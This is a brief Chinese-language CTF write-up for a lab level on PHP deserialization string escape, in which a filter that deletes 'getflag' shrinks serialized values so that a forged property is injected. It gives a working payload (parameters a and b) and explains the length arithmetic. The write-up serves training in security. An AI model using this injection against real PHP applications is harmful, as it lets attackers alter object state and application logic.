# WriteUP · Level 19 · 字符串逃逸·减少

## 原理

过滤函数把 `getflag` 从序列化串中删除,但每个属性值声明的长度 `s:N` 不变。
被删 7 个字符,解析器就会"多读"7 个字符,把属性值后面的结构吞进值里。
我们在 b 的值里放置伪造的属性结构,让吞掉的位置之后正好是它。

## 已验证 EXP

```
a=getflaggetflaggetflaggetflaggetflaggetflag
&b=FFFFFFFFFFFFFFFF";s:10:"helloctf_b";s:8:"get_flag";}
```

原理:a 的 6 个 getflag(42 字符)被过滤后,a 的声明长度不变,
解析器把 `";s:10:"helloctf_b";s:52:"` + 16 个 F 一并吞进 a 的值里
(2 + 18 + 6 + 16 = 42),边界正好落在注入结构的 `";` 前,
注入结构被解析为真正的 helloctf_b 属性。

## 思路验证

还原后的对象应 dump 出两个属性,其中 `helloctf_b` 为 `get_flag`。

